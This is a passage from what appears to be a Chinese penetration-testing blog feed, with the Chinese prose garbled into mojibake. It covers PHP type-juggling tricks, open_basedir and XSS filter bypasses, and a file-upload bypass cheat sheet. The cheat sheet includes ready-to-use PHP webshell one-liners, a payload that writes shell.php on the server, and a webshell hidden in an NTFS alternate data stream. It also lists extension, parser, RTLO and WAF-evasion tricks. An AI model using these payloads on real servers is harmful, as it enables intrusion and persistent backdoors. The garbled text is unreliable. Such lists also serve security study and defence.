class="line">å¯¹æ•°ç»„è¿›è¡ŒMD5ï¼Œsha1ç­‰hashè¿ç®—æ—¶ï¼Œç»“æœéƒ½ä¸ºNULL</div><div class="line">md5(name[] = 1) == md5(password[]= 2) â€”&gt;NULL == NULL â€”&gt;true</div><div class="line"></div><div class="line">strcmp</div><div class="line">strcmp(string $str1,string $str2 )</div><div class="line">å¦‚æœstr1å°äºstr2,è¿”å›-1ï¼Œç›¸ç­‰è¿”å›0ï¼Œå¦åˆ™è¿”å›1ã€‚</div><div class="line">strcmpå‡½æ•°æ¯”è¾ƒå­—ç¬¦ä¸²çš„æœ¬è´¨æ˜¯å°†ä¸¤ä¸ªå˜é‡è½¬æ¢ä¸ºasciiï¼Œç„¶åè¿›è¡Œå‡æ³•è¿ç®—ï¼Œç„¶åæ ¹æ®è¿ç®—ç»“æœæ¥å†³å®šè¿”å›å€¼ã€‚</div><div class="line">å¦‚æœä¼ å…¥çš„å‚æ•°ä¸ºæ•°å­—æˆ–æ•°ç»„,å†å’Œå­—ç¬¦ä¸²åšstrcmpï¼Œå°±ä¼šè¿”å›NULL</div><div class="line">strcmp($array,&apos;123&apos;) == 0</div><div class="line">å½“arrayä¸ºæ•°å­—æˆ–è€…æ•°ç»„æ—¶ï¼Œç­‰å¼ç­‰äºtrue</div><div class="line">$array=[1,2,3] â€”&gt; strcmp([1,2,3] ,&apos;123&apos;) â€”&gt; NULL â€”&gt;NULL == 0</div><div class="line"></div><div class="line">in_array()ï¼šå‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼</div><div class="line">$array=(0,1,2,&apos;3&apos;)</div><div class="line">in_array(&apos;abc&apos;, $array) â€”&gt; &apos;abc&apos; â€”&gt; 0 â€”&gt; 0 == array[0] â€”&gt; true</div><div class="line">$array=(0,1,2,3)</div><div class="line">in_array($search, $array)</div><div class="line">å½“ä¼ å…¥$search = 1&apos;aaaaaaaa ç»“æœä¸ºtrue</div><div class="line">in_array($search, $array) â€”&gt; 1&apos;aaaaaaaa â€”&gt; 1 â€”&gt; 1 == array[1] â€”&gt; true</div><div class="line">æ³¨ï¼šin_array æœ‰ç¬¬ä¸‰ä¸ªå‚æ•°</div><div class="line">in_array(â€™5\â€™ union selectâ€™, array(1, 5, 3, 2), true) â€”&gt; false</div><div class="line"></div><div class="line">ereg</div><div class="line">ereg(string pattern, string string, array [regs])</div><div class="line">å­—ç¬¦ä¸²å¯¹æ¯”è§£æï¼Œä»¥ pattern çš„è§„åˆ™æ¥è§£ææ¯”å¯¹å­—ç¬¦ä¸² stringã€‚æ¯”å¯¹ç»“æœè¿”å›çš„å€¼æ”¾åœ¨æ•°ç»„å‚æ•° regs ä¹‹ä¸­ï¼Œ</div><div class="line">regs[0] å†…å®¹å°±æ˜¯åŸå­—ç¬¦ä¸² stringã€regs[1] ä¸ºç¬¬ä¸€ä¸ªåˆä¹è§„åˆ™çš„å­—ç¬¦ä¸²ã€regs[2] å°±æ˜¯ç¬¬äºŒä¸ªåˆä¹è§„åˆ™çš„å­—ç¬¦ä¸²ï¼Œä½™ç±»æ¨ã€‚</div><div class="line">è‹¥çœç•¥å‚æ•° regsï¼Œåˆ™åªæ˜¯å•çº¯åœ°æ¯”å¯¹ï¼Œæ‰¾åˆ°åˆ™è¿”å›å€¼ä¸º trueã€‚</div><div class="line">eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå½“eregè¯»å–å­—ç¬¦ä¸²stringæ—¶,å¦‚æœé‡åˆ°äº†%00,åé¢çš„å­—ç¬¦ä¸²å°±ä¸ä¼šè¢«è§£æ</div><div class="line">$ip = &quot;192.168.2.11&quot;.chr(0).&quot;haha&quot;;  </div><div class="line">if(ereg(&quot;^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$&quot;,$ip)) &#123;  </div><div class="line">        echo $ip;  </div><div class="line">&#125; else &#123;  </div><div class="line">        echo &quot;unknown&quot;;  </div><div class="line">&#125; </div><div class="line">è¾“å‡ºï¼š192.168.2.11haha</div><div class="line">æ³¨ï¼šç»“åˆeregå¤„ç†$ _SERVERçš„æƒ…å†µ</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="ç»•è¿‡open-basedir"><a href="#ç»•è¿‡open-basedir" class="headerlink" title="ç»•è¿‡open_basedir"></a>ç»•è¿‡open_basedir</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">åˆ©ç”¨DirectoryIterator + Glob ç›´æ¥åˆ—ä¸¾ç›®å½•</div><div class="line">realpathåˆ—ä¸¾ç›®å½•</div><div class="line">SplFileInfo::getRealPathåˆ—ä¸¾ç›®å½•</div><div class="line">GDåº“imageftbbox/imagefttextåˆ—ä¸¾ç›®å½•</div><div class="line">bindtextdomainæš´åŠ›çŒœè§£ç›®å½•</div></pre></td></tr></table></figure>
<h1 id="XSSç»•è¿‡"><a href="#XSSç»•è¿‡" class="headerlink" title="XSSç»•è¿‡"></a>XSSç»•è¿‡</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">. å¯ä»¥ç”¨ with</div><div class="line">onerror å¯ä»¥ç”¨ onblur oncut</div><div class="line">window å¯ä»¥ç”¨ top parent self</div><div class="line">al%00ert</div><div class="line">``</div><div class="line">\x0A\x0D å¯ä»¥ç”¨ \x2028\x2029</div><div class="line">base64è§£ç å‡½æ•°atob()</div><div class="line">&quot;oncut=_=window;_.onerror=_[&quot;al&quot;+&quot;ert&quot;];throw[1]</div><div class="line">&quot;oncut=location=&quot;javascript:aler&quot;+&quot;t%&quot;+&quot;281%&quot;+&quot;29</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> XSS </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> PHP </tag>
            
            <tag> webshell </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ–‡ä»¶ä¸Šä¼ (ç»•è¿‡)]]></title>
      <url>/2017/02/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<p>æ ¹æ®ä¸ªäººç»éªŒ,æœé›†æ€»ç»“ï¼Œæ¬¢è¿å¤§ç‰›ä»¬è¡¥å……ã€çº é”™  -_-<br><a id="more"></a></p>
<h1 id="æ–‡ä»¶ä¸Šä¼ æ ¡éªŒå§¿åŠ¿"><a href="#æ–‡ä»¶ä¸Šä¼ æ ¡éªŒå§¿åŠ¿" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ ¡éªŒå§¿åŠ¿"></a>æ–‡ä»¶ä¸Šä¼ æ ¡éªŒå§¿åŠ¿</h1><ul>
<li>å®¢æˆ·ç«¯javascriptæ ¡éªŒï¼ˆä¸€èˆ¬åªæ ¡éªŒåç¼€åï¼‰</li>
<li>æœåŠ¡ç«¯æ ¡éªŒ</li>
<li>æ–‡ä»¶å¤´<code>content-type</code>å­—æ®µæ ¡éªŒï¼ˆimage/gifï¼‰</li>
<li>æ–‡ä»¶å†…å®¹å¤´æ ¡éªŒï¼ˆGIF89aï¼‰</li>
<li>åç¼€åé»‘åå•æ ¡éªŒ</li>
<li>åç¼€åç™½åå•æ ¡éªŒ</li>
<li>è‡ªå®šä¹‰æ­£åˆ™æ ¡éªŒ</li>
<li>WAFè®¾å¤‡æ ¡éªŒï¼ˆæ ¹æ®ä¸åŒçš„WAFäº§å“è€Œå®šï¼‰</li>
</ul>
<h1 id="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ ¡éªŒå§¿åŠ¿"><a href="#æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ ¡éªŒå§¿åŠ¿" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ ¡éªŒå§¿åŠ¿"></a>æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ ¡éªŒå§¿åŠ¿</h1><ul>
<li>å®¢æˆ·ç«¯ç»•è¿‡ï¼ˆæŠ“åŒ…æ”¹åŒ…ï¼‰</li>
<li>æœåŠ¡ç«¯ç»•è¿‡</li>
<li>æ–‡ä»¶ç±»å‹</li>
<li>æ–‡ä»¶å¤´</li>
<li>æ–‡ä»¶åç¼€å</li>
<li>é…åˆæ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡</li>
<li>é…åˆæœåŠ¡å™¨è§£ææ¼æ´ç»•è¿‡</li>
<li>CMSã€ç¼–è¾‘å™¨æ¼æ´ç»•è¿‡</li>
<li>é…åˆæ“ä½œç³»ç»Ÿæ–‡ä»¶å‘½åè§„åˆ™ç»•è¿‡</li>
<li>é…åˆå…¶ä»–è§„åˆ™ç»•è¿‡</li>
<li>WAFç»•è¿‡</li>
<li>é»‘åå•ç»•è¿‡</li>
<li>ç™½åå•ç»•è¿‡</li>
</ul>
<h2 id="1-å®¢æˆ·ç«¯ç»•è¿‡"><a href="#1-å®¢æˆ·ç«¯ç»•è¿‡" class="headerlink" title="1.å®¢æˆ·ç«¯ç»•è¿‡"></a>1.å®¢æˆ·ç«¯ç»•è¿‡</h2><p>å¯ä»¥åˆ©ç”¨burpç­‰æŠ“åŒ…æ”¹åŒ…ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªgifç±»å‹çš„æœ¨é©¬ï¼Œç„¶åé€šè¿‡burpå°†å…¶æ”¹ä¸º<code>asp/php/jsp</code>åç¼€åå³å¯ã€‚</p>
<h2 id="2-æœåŠ¡ç«¯ç»•è¿‡"><a href="#2-æœåŠ¡ç«¯ç»•è¿‡" class="headerlink" title="2.æœåŠ¡ç«¯ç»•è¿‡"></a>2.æœåŠ¡ç«¯ç»•è¿‡</h2><h3 id="2-1-æ–‡ä»¶ç±»å‹ç»•è¿‡"><a href="#2-1-æ–‡ä»¶ç±»å‹ç»•è¿‡" class="headerlink" title="2.1 æ–‡ä»¶ç±»å‹ç»•è¿‡"></a>2.1 æ–‡ä»¶ç±»å‹ç»•è¿‡</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ“åŒ…ï¼Œå°†<code>content-type</code>å­—æ®µæ”¹ä¸º<code>image/gif</code></p>
<h3 id="2-2-æ–‡ä»¶å¤´ç»•è¿‡"><a href="#2-2-æ–‡ä»¶å¤´ç»•è¿‡" class="headerlink" title="2.2 æ–‡ä»¶å¤´ç»•è¿‡"></a>2.2 æ–‡ä»¶å¤´ç»•è¿‡</h3><p>åœ¨æœ¨é©¬æ–‡ä»¶å†…å®¹å¼€å¤´åŠ ä¸Šä¸€äº›æ–‡ä»¶å¤´ä¿¡æ¯</p>
<blockquote>
<p>GIF89a&lt;?php phpinfo(); ?&gt;</p>
</blockquote>
<p>åˆ¤æ–­æ–‡ä»¶å¤´å†…å®¹æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œè¿™é‡Œä¸¾å‡ ä¸ªå¸¸è§çš„æ–‡ä»¶å¤´å¯¹åº”å…³ç³»ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ï¼ˆ1ï¼‰  .JPEG;.JPE;.JPGï¼Œâ€JPGGraphic Fileâ€</div><div class="line">ï¼ˆ2ï¼‰  .gifï¼Œâ€GIF 89Aâ€</div><div class="line">ï¼ˆ3ï¼‰  .zipï¼Œâ€Zip Compressedâ€</div><div class="line">ï¼ˆ4ï¼‰  .doc;.xls;.xlt;.ppt;.aprï¼Œâ€MS Compound Document v1 or Lotus Approach APRfileâ€</div></pre></td></tr></table></figure></p>
<h3 id="2-3-æ–‡ä»¶å-åç¼€ç»•è¿‡"><a href="#2-3-æ–‡ä»¶å-åç¼€ç»•è¿‡" class="headerlink" title="2.3 æ–‡ä»¶å/åç¼€ç»•è¿‡"></a>2.3 æ–‡ä»¶å/åç¼€ç»•è¿‡</h3><h4 id="2-3-1-æˆªæ–­"><a href="#2-3-1-æˆªæ–­" class="headerlink" title="2.3.1 æˆªæ–­"></a>2.3.1 æˆªæ–­</h4><p><code>test.php%00.jpg</code>,<code>test.php0xoo.jpg</code></p>
<h4 id="2-3-2-windowsç‰¹æ€§"><a href="#2-3-2-windowsç‰¹æ€§" class="headerlink" title="2.3.2 windowsç‰¹æ€§"></a>2.3.2 windowsç‰¹æ€§</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ADSæµï¼štest.php::$DATA(è§ä¸‹)</div><div class="line">test.php.</div><div class="line">test.php_</div><div class="line">test.php(ç©ºæ ¼)</div><div class="line">*=.</div><div class="line">&lt;=*</div><div class="line">&gt;=?</div><div class="line">test.&lt;&lt;&lt;</div><div class="line">test.php:1.jpgä¼šç”Ÿæˆä¸€ä¸ªtest.phpçš„ç©ºæ–‡ä»¶</div></pre></td></tr></table></figure>
<h4 id="2-3-3-ASP"><a href="#2-3-3-ASP" class="headerlink" title="2.3.3 ASP"></a>2.3.3 ASP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">è§£ææ¼æ´:</div><div class="line">.asp;.jpg</div><div class="line">.asp.jpg</div><div class="line">.asp;jpg</div><div class="line">+111.asp;+222.jpg</div><div class="line">/111.asp/1.jpg</div><div class="line">/111.aspx/1.jpg</div><div class="line">åç¼€åï¼š</div><div class="line">asa,cer,cdx,ashx,asmx,xml,htr,asax</div><div class="line">åŒæ–‡ä»¶æ‰©å±•ï¼š</div><div class="line">test.asp.jpg</div><div class="line">RTLOï¼š</div><div class="line">asp.html-å†…å®¹ä¸ºä¸€å¥è¯</div><div class="line">php.txt-å†…å®¹ä¸ºä¸€å¥è¯</div></pre></td></tr></table></figure>
<h4 id="2-3-4-JSP"><a href="#2-3-4-JSP" class="headerlink" title="2.3.4 JSP"></a>2.3.4 JSP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.jsp.jpg.jsp-ç”¨ä¸¤ä¸ªjspåŒ…å›´ä¸­é—´çš„jpg</div><div class="line">åç¼€åï¼šjspf,jspa,jsps</div></pre></td></tr></table></figure>
<h4 id="2-3-5-PHP"><a href="#2-3-5-PHP" class="headerlink" title="2.3.5 PHP"></a>2.3.5 PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">åç¼€åï¼š.php3 ,.php5,.php7</div><div class="line">å¤§å°å†™ï¼špHp</div><div class="line">è§£ææ¼æ´ï¼š</div><div class="line">1.php.jpg</div><div class="line">1.jpg.php</div><div class="line">1.php  jpg(jpgå‰é¢ä¸¤ä¸ªç©ºæ ¼)</div><div class="line">1.php jpg(jpgå‰é¢ä¸€ä¸ªç©ºæ ¼)</div><div class="line">/1.jpg/1.php</div><div class="line">/1.jpg%00.php</div><div class="line">/1.jpg/.php</div><div class="line">/1.jpg/php</div><div class="line">ç‰¹æ®Šæ–‡ä»¶åˆ©ç”¨ï¼š</div><div class="line">.htaccess</div><div class="line">.user.ini</div></pre></td></tr></table></figure>
<h3 id="3-é…åˆæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#3-é…åˆæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="3.é…åˆæ–‡ä»¶åŒ…å«æ¼æ´"></a>3.é…åˆæ–‡ä»¶åŒ…å«æ¼æ´</h3><ol>
<li>ä¸Šä¼ ä¸€ä¸ªç¬¦åˆæ¡ä»¶æ ¼å¼çš„æ–‡æ¡£ï¼Œæ–‡æ¡£å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œegï¼štest.txt</li>
<li>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶,eg:page?id=D:/www/test.txt</li>
</ol>
<h3 id="4-é…åˆæœåŠ¡å™¨è§£ææ¼æ´"><a href="#4-é…åˆæœåŠ¡å™¨è§£ææ¼æ´" class="headerlink" title="4.é…åˆæœåŠ¡å™¨è§£ææ¼æ´"></a>4.é…åˆæœåŠ¡å™¨è§£ææ¼æ´</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">IIS5.x-6.x:</div><div class="line">ç›®å½•è§£æ(6.0):/1.asp/1.jpg</div><div class="line">æ–‡ä»¶è§£æ:1.asp;.jpg</div><div class="line">æ–‡ä»¶ç±»å‹:1.asa,a.cer,1.cdx</div><div class="line">IIS7.5ï¼š</div><div class="line">IIS7.5æ˜¯ç”±äºphpé…ç½®æ–‡ä»¶ä¸­ï¼Œå¼€å¯äº†cgi.fix_pathinf</div><div class="line">Apache:</div><div class="line">ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­</div><div class="line">åç¼€ä¸è¯†åˆ«ï¼š1.php.php123</div><div class="line">é…ç½®é”™è¯¯ï¼š1.php.jpg</div><div class="line">Nginxï¼š</div><div class="line">Nginxé»˜è®¤æ˜¯ä»¥CGIçš„æ–¹å¼æ”¯æŒPHPè§£æçš„ï¼Œå’ŒIIS7.5ä¸€æ ·å¼€å¯äº†cgi.fix_pathinf</div><div class="line">1.jpg/1.php</div><div class="line">1.jpg%00.php</div><div class="line">1.jpg/%20\1.php</div><div class="line">ä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºtest.jpgï¼Œä»¥ä¸‹å†…å®¹çš„æ–‡ä»¶</div><div class="line">&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[caidao])?&gt;&apos;);?&gt;</div><div class="line">ç„¶åè®¿é—®test.jpg/.php,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬shell.php</div></pre></td></tr></table></figure>
<h3 id="5-é…åˆæ“ä½œç³»ç»Ÿæ–‡ä»¶å‘½ä»¤è§„åˆ™"><a href="#5-é…åˆæ“ä½œç³»ç»Ÿæ–‡ä»¶å‘½ä»¤è§„åˆ™" class="headerlink" title="5.é…åˆæ“ä½œç³»ç»Ÿæ–‡ä»¶å‘½ä»¤è§„åˆ™"></a>5.é…åˆæ“ä½œç³»ç»Ÿæ–‡ä»¶å‘½ä»¤è§„åˆ™</h3><ol>
<li><p>ä¸Šä¼ ä¸ç¬¦åˆwindowsæ–‡ä»¶å‘½åè§„åˆ™çš„æ–‡ä»¶å</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">test.asp.</div><div class="line">test.asp(ç©ºæ ¼)</div><div class="line">test.php:1.jpg</div><div class="line">test.php::$DATA</div><div class="line">shell.php::$DATAâ€¦â€¦.</div><div class="line">ä¼šè¢«windowsç³»ç»Ÿè‡ªåŠ¨å»æ‰ä¸ç¬¦åˆè§„åˆ™ç¬¦å·åé¢çš„å†…å®¹ã€‚</div></pre></td></tr></table></figure>
</li>
<li><p>linuxä¸‹åç¼€åå¤§å°å†™<br>åœ¨linuxä¸‹ï¼Œå¦‚æœä¸Šä¼ phpä¸è¢«è§£æï¼Œå¯ä»¥è¯•è¯•ä¸Šä¼ pHpåç¼€çš„æ–‡ä»¶åã€‚</p>
<h3 id="6-CMSã€ç¼–è¾‘å™¨æ¼æ´"><a href="#6-CMSã€ç¼–è¾‘å™¨æ¼æ´" class="headerlink" title="6.CMSã€ç¼–è¾‘å™¨æ¼æ´"></a>6.CMSã€ç¼–è¾‘å™¨æ¼æ´</h3></li>
</ol>
<ul>
<li>CMSæ¼æ´ï¼šé’ˆå¯¹ä¸åŒCMSå­˜åœ¨çš„ä¸Šä¼ æ¼æ´è¿›è¡Œç»•è¿‡ã€‚</li>
<li>ç¼–è¾‘å™¨æ¼æ´ï¼šæ¯”å¦‚FCKï¼ŒEwebeditorç­‰ï¼Œå¯ä»¥é’ˆå¯¹ç¼–è¾‘å™¨çš„æ¼æ´è¿›è¡Œç»•è¿‡ã€‚</li>
</ul>
<h3 id="7-å…¶ä»–è§„åˆ™"><a href="#7-å…¶ä»–è§„åˆ™" class="headerlink" title="7.å…¶ä»–è§„åˆ™"></a>7.å…¶ä»–è§„åˆ™</h3><h4 id="7-1-åˆ©ç”¨wafç‰¹æ€§"><a href="#7-1-åˆ©ç”¨wafç‰¹æ€§" class="headerlink" title="7.1 åˆ©ç”¨wafç‰¹æ€§"></a>7.1 åˆ©ç”¨wafç‰¹æ€§</h4><ul>
<li>åœ¨æ¶æ„ä»£ç å‰åŠ åƒåœ¾æ•°æ®ï¼›</li>
<li>åœ¨æ•°æ®åŒ…å‰åŠ åƒåœ¾æ•°æ®ï¼›</li>
<li>åœ¨Content-Dispositionå‚æ•°åé¢åŠ åƒåœ¾æ•°æ®ï¼›</li>
<li>å¤šåŠ ä¸€ä¸ªfilenameï¼›</li>
<li>æ›´æ”¹HTTPè¯·æ±‚æ–¹æ³•ï¼›</li>
<li>åˆ é™¤å®ä½“é‡Œé¢çš„Conten-Typeå­—æ®µï¼›<blockquote>
<p>ç¬¬ä¸€ç§æ˜¯åˆ é™¤Contentæ•´è¡Œï¼Œç¬¬äºŒç§æ˜¯åˆ é™¤Cåé¢çš„å­—ç¬¦ã€‚åˆ é™¤æ‰ontent-Type: image/jpegåªç•™ä¸‹cï¼Œå°†.phpåŠ cåé¢å³å¯ï¼Œä½†æ˜¯è¦æ³¨æ„é¢ï¼ŒåŒå¼•å·è¦è·Ÿç€c.phpã€‚</p>
</blockquote>
</li>
<li>åˆ é™¤Content-Dispositionå­—æ®µé‡Œçš„ç©ºæ ¼</li>
<li>å¢åŠ ä¸€ä¸ªç©ºæ ¼</li>
<li>ä¿®æ”¹Content-Dispositionå­—æ®µå€¼çš„å¤§å°å†™</li>
<li>æ–‡ä»¶ååç¼€å¤„å›è½¦</li>
<li>å¤šä¸ªContent-Disposition<h4 id="7-2-åˆ©ç”¨NTFS-ADSç‰¹æ€§"><a href="#7-2-åˆ©ç”¨NTFS-ADSç‰¹æ€§" class="headerlink" title="7.2 åˆ©ç”¨NTFS ADSç‰¹æ€§"></a>7.2 åˆ©ç”¨NTFS ADSç‰¹æ€§</h4>ADSæ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œç”¨äºNTFSäº¤æ¢æ•°æ®æµã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">test.php:a.jpgã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ç”Ÿæˆtest.php  ç©º</div><div class="line">test.php::$INDEX_ALLOCATION  ç”Ÿæˆtest.phpæ–‡ä»¶å¤¹  </div><div class="line">test.php::$DATA\1.jpg  ã€€ã€€ã€€ç”Ÿæˆ1.jpg(ä¸å¯è§çš„)</div><div class="line">echo ^&lt;?php @eval(request[caidao])?^&gt;  &gt; index.php:hidden.jpg</div><div class="line">è¿™æ ·å­å°±ç”Ÿæˆäº†ä¸€ä¸ªä¸å¯è§çš„shell hidden.jpgï¼Œå¸¸è§„çš„æ–‡ä»¶ç®¡ç†å™¨ã€typeå‘½ä»¤ï¼Œdirå‘½ä»¤ã€delå‘½ä»¤å‘ç°éƒ½æ‰¾ä¸å‡ºé‚£ä¸ªhidden.jpgçš„ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å¦å¤–ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶é‡ŒæŠŠè¿™ä¸ªADSæ–‡ä»¶includeè¿›å»ï¼Œ&lt;?php include(â€˜index.php:hidden.jpgâ€™)?&gt;ï¼Œè¿™æ ·å­å°±å¯ä»¥æ­£å¸¸è§£ææˆ‘ä»¬çš„ä¸€å¥è¯äº†</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="7-3-åˆ©ç”¨RTLO"><a href="#7-3-åˆ©ç”¨RTLO" class="headerlink" title="7.3 åˆ©ç”¨RTLO"></a>7.3 åˆ©ç”¨RTLO</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">æ–°å»ºä¸€ä¸ªæ–‡ä»¶php.html</div><div class="line">å†…å®¹ä¸ºï¼š&lt;?php @eval($_POST[&apos;caidao&apos;]);?&gt;</div><div class="line">é‡å‘½åæ–‡ä»¶ï¼šè¾“å…¥åå­—çš„æ–‡æœ¬æ¡†é‡Œç‚¹å³é”®ï¼Œé€‰æ‹©â€œæ’å…¥unicodeæ§åˆ¶å­—ç¬¦â€ï¼Œç„¶åå°±åˆ°äº†è¿™ä¸ªèœå•æ ï¼Œæˆ‘ä»¬é€‰æ‹©RLO</div><div class="line">è¿™ä¸ªæ—¶å€™php.htmlå·²ç»å˜æˆäº†html.phpäº†</div></pre></td></tr></table></figure>
<h4 id="7-4-ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡"><a href="#7-4-ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡" class="headerlink" title="7.4 ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡"></a>7.4 ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡</h4><p>æ–‡ä»¶åä½¿ç”¨éå­—æ¯æ•°å­—ï¼Œæ¯”å¦‚ä¸­æ–‡ç­‰æœ€å¤§ç¨‹åº¦çš„æ‹‰é•¿<br><code>shell.asp;ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹.jpg</code></p>
<h4 id="7-5-ååˆ é™¤"><a href="#7-5-ååˆ é™¤" class="headerlink" title="7.5 ååˆ é™¤"></a>7.5 ååˆ é™¤</h4><p>å°†<code>name=&quot;file1&quot;</code>æ”¹æˆäº†file4ï¼Œå¯ä»¥é˜²æ­¢æ–‡ä»¶åˆ é™¤ï¼ˆJCMSæ¼æ´ï¼‰</p>
<h4 id="7-8-å›¾ç‰‡è½¬æ¢-äºŒæ¬¡æ¸²æŸ“-æ–‡ä»¶å¹»æ•°æ£€æµ‹"><a href="#7-8-å›¾ç‰‡è½¬æ¢-äºŒæ¬¡æ¸²æŸ“-æ–‡ä»¶å¹»æ•°æ£€æµ‹" class="headerlink" title="7.8 å›¾ç‰‡è½¬æ¢/äºŒæ¬¡æ¸²æŸ“/æ–‡ä»¶å¹»æ•°æ£€æµ‹"></a>7.8 å›¾ç‰‡è½¬æ¢/äºŒæ¬¡æ¸²æŸ“/æ–‡ä»¶å¹»æ•°æ£€æµ‹</h4><ul>
<li>åœ¨ä¸ç ´åæ–‡ä»¶æœ¬èº«æ¸²æŸ“æƒ…å†µä¸‹ï¼Œåœ¨ç©ºç™½åŒºè¿›è¡Œä»£ç å¡«å……ï¼Œä¸€èˆ¬æ˜¯å›¾ç‰‡æ³¨é‡Š</li>
<li>æº¢å‡ºæ”»å‡»</li>
<li>ç»•è¿‡GDåº“</li>
</ul>
<p>â€¦</p>
]]></content>
      
        
        <tags>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> PHP </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[åº”æ€¥å“åº”èµ„æ–™æ•´ç†]]></title>
